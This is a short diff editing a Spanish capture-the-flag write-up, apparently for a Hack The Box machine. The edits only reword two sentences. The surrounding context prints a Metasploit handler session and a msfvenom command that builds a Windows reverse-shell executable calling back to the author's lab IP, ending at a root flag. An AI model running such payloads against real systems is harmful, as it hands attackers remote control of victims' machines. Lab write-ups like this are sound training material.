@@ -365,7 +365,7 @@ En este apartado vamos a crear un payload que nos servirá como reverse shell co
     msf6 exploit(multi/handler) >
 
 He utilizado un payload incluído en la propia herramienta y lo único que he tenido que modificar ha sido el host de escucha, que es mi IP actual '10.10.14.27' y el puerto de escucha, que he elegido '1234'.<br/><br/>
-Lo siguiente fue crear un fichero .exe que será el que enviaré al servidor para que arranque el reverse shell en Metasploit.<br/>
+Lo siguiente fue crear un fichero .exe que será el que descargaré en el servidor para que arranque el reverse shell en Metasploit.<br/>
 
     ┌──(root㉿kali)-[/home/nico/htb]
     └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.27 LPORT=1234 -f exe -o shell.exe
@@ -456,4 +456,4 @@ Por último arranco el exploit en Metasploit y seguidamente ejecuto el fichero '
 
     C:\Users\Administrator\Desktop>
 
-Como se puede ver, el flag del root se encuentra en el directorio Desktop bajo el nombre 'root.txt'.
+Como se puede ver, el flag del root se encuentra en el directorio 'Desktop' dentro del fichero 'root.txt'.
